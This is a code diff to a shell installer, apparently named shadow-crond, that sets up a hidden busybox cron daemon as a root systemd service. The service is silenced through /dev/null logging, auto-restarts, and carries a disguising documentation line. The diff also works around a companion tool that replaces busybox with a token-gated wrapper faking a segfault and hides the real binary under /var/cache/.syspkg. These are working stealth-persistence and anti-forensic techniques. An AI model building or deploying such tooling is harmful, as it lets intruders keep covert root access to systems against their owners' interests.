@@ -38,6 +38,22 @@ cmd_install() {
     fi
     [[ -z "$BUSYBOX" ]] && { warn "busybox not found — install it first (apt install busybox)"; exit 1; }
 
+    # ── detect lock-busybox wrapper ───────────────────────────────────────────
+    # If lock-busybox.sh ran first, the binary at $BUSYBOX is the gated wrapper
+    # (contains "RT_TOK").  Calling it without the token gives a fake segfault and
+    # aborts install.  Fall back to the hidden real binary lock-busybox preserves.
+    if grep -q "RT_TOK" "$BUSYBOX" 2>/dev/null; then
+        warn "busybox at $BUSYBOX is the lock-busybox gate wrapper (lock-busybox ran first)"
+        if [[ -x "/var/cache/.syspkg/busybox.real" ]]; then
+            BUSYBOX="/var/cache/.syspkg/busybox.real"
+            info "Falling back to real busybox at $BUSYBOX"
+        else
+            warn "No backup at /var/cache/.syspkg/busybox.real — cannot proceed"
+            warn "Fix: lock-busybox.sh remove → shadow-crond.sh install → lock-busybox.sh install"
+            exit 1
+        fi
+    fi
+
     # verify it has crond
     "$BUSYBOX" crond --help &>/dev/null || \
     "$BUSYBOX" crond -h    &>/dev/null || \
@@ -81,14 +97,13 @@ Documentation=https://systemd.io
 After=network.target
 
 [Service]
-Type=forking
+Type=simple
 # busybox crond flags:
-#   -b  background (fork)
+#   -f  foreground (let systemd own the process)
 #   -c  custom spool directory
 #   -L  log file (/dev/null = silent)
 #   -l  log level 8 = only log errors
-ExecStart=${CROND_BIN} crond -b -c ${SPOOL_DIR} -L ${LOG_FILE} -l 8
-ExecStop=/bin/kill -QUIT \$MAINPID
+ExecStart=${CROND_BIN} crond -f -c ${SPOOL_DIR} -L ${LOG_FILE} -l 8
 Restart=always
 RestartSec=10
 User=root
